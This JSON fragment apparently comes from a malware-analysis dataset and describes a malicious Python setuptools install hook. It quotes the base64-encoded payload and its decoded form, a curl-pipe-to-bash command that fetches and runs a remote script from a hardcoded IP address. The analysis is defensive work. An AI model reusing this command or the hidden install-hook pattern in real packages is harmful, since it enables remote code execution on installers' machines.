      "malicious_behavior": "The code defines a setuptools installation hook that executes a base64-decoded shell command during package installation. Specifically, the function 'notmalfunc' decodes the base64 string 'Y3VybCAgLXMgaHR0cDovLzE5Mi4xNjguMS4zNDo4MDAwL3Jldi5zaCB8IGJhc2gK' which translates to the shell command: 'curl -s http://192.168.1.34:8000/rev.sh | bash'. This command silently downloads and executes a shell script from a remote IP address without user interaction or consent. The execution is triggered automatically in the 'AfterInstall' class's 'run' method, which overrides the standard install command. This pattern—obfuscated base64-encoded shell command executed during package installation, contacting a hardcoded private IP address to fetch and run a remote script—is a classic hallmark of supply chain attacks and remote code execution malware. There is no legitimate reason for such behavior in a benign package, and it poses a critical security risk by enabling arbitrary code execution on the victim's system during package installation."
